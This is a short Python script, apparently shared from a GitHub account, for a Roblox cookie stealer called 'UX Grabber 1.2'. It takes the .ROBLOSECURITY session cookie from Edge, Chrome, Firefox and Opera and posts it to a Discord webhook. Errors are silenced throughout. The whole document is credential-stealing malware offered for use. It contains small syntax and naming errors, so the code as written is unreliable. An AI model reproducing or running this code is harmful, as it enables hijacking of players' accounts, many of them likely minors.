



#  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗██╗░░░██╗███╗░░██╗██╗██╗░░██╗--
 # ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝██║░░░██║████╗░██║██║╚██╗██╔╝--
#  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░██║░░░██║██╔██╗██║██║░╚███╔╝░--
#  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░██║░░░██║██║╚████║██║░██╔██╗░--
#  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░╚██████╔╝██║░╚███║██║██╔╝╚██╗-
#  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚═╝---
#                        github.com/ScriptUnix 

                        # Credit me lol or die
 
 import browser_cookie3, requests, threading

                               #Put your webhook below in between the ""

WebHook = " Your discord webhook here "


































def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'UX Grabber 1.2','avatar_url':'https://iili.io/HBpFX2a.jpg,''content':f'```Success ✅ : {cookie}```'})
    except:
        pass
def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'UX Grabber 1.2','avatar_url':'https://iili.io/HBpFX2a.jpg,''content':f'```Success ✅ : {cookie}```'})
    except:
        pass


def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'UX Grabber 1.2','avatar_url':'https://iili.io/HBpFX2a.jpg,''content':f'```Success ✅ : {cookie}```'})
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'UX Grabber 1.2','avatar_url':'https://iili.io/HBpFX2a.jpg,''content':f'```Success ✅ : {cookie}```'})
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()
